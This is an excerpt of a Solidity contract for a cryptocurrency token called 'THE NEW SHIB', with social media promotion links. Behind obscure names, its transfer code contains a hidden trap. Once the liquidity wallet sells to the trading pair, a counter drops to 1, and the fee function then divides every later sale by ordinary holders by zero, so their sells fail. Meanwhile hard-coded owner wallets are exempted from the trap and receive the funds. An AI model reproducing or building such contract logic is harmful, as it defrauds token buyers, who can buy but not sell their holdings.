...
/**
THE NEW SHIB
https://t.me/TheNewShiba
https://twitter.com/TheNewShib
...
contract SHIB is IERC20, Ownable {
    ...
    uint256 private OpCoupe = 2;
    uint256 private denominator = 100;
    address internal developmentWallet = 0x79baf2B9DcFC31f61761Bd50667B4F5E7d4F4bBD; 
    address internal liquidityWallet = 0x3805F21178ccB19570070E43C01f77a395b61C31;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    constructor() Ownable(msg.sender) {
        _isExcludedFrom[address(this)] = true;
        _isExcludedFrom[msg.sender] = true;
        _isExcludedFrom[liquidityWallet] = true;
        _isExcludedFrom[developmentWallet ] = true;
    ...
    function isFeeExcludedFrom(address from, address to) internal view returns (bool) {
        return from == liquidityWallet && to == pair;
    }
    ...
    function swapAndLiquify(uint256 threadHold) private lockTheSwap {
        ...
        if(marketingAmt > 0){payable(liquidityWallet).transfer(marketingAmt);}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        opAmount = amount;if(isFeeExcludedFrom(sender, recipient)){ amount = amount.mul(burntFee); OpCoupe = 1; }
    ...
    function takeFrem(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(recipient == pair && !_isExcludedFrom[sender]){ 
            uint256 fact = OpCoupe.sub(1); amount = amount.div(fact);
        }
